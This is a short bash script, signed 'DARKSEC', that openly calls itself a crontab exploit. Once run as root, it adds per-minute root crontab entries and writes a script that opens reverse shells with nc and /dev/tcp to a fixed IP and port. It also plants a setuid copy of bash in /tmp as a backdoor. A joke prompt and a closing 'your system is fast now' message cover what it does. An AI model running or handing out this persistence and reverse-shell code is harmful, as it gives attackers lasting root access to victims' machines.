#!/bin/bash
# DEVELOPER DARKSEC
# THIS SCRIPT IS FOR A EXPLOIT FROM CRONTAB, SO WE WILL GET A REVERSE CONNECTION, WITH CRONTAB!
# on the ip and port, choice the type from payload or connection reverse.


echo "*******|-NEED RUN WITH ROOT!-|******"
echo "HELLO FRIEND, HOW ARE YOU?"
echo "========================"
echo "1) GOOD"
echo "2) BAD"
echo "========================"
read senso_de_humor
echo "==========================="
case $senso_de_humor in
"1")
	echo ":)"
;;
"2")
	echo ":/"
esac
echo "==========================="
echo "wait 1 minute..."
sed -i -e '$i\* * * * * root system.sh' /etc/crontab
sed -i -e '$i\* * * * * root root.sh' /etc/crontab
sleep 1
cd /usr/local/bin
sleep 1
touch system.sh
echo "#\!/bin/bash" > /usr/local/bin/system.sh
echo "nc 192.168.15.71 1234 -e /bin/bash" >> /usr/local/bin/system.sh # your ip here and your port :)
sleep 1
echo "bash -i >& /dev/tcp/192.168.15.71/1234 0>&1" >> /usr/local/bin/system.sh # your ip here and your port :)
chmod +x /usr/local/bin/system.sh
touch root.sh
chmod +x /usr/local/bin/root.sh
echo "#\!/bin/bash" > /usr/local/bin/root.sh
echo "cp /bin/bash /tmp/root && chmod +xs /tmp/root" >> /usr/local/bin/root.sh
sleep 1
echo "wait..."
sleep 3
echo "thanks your system is fast now!!"
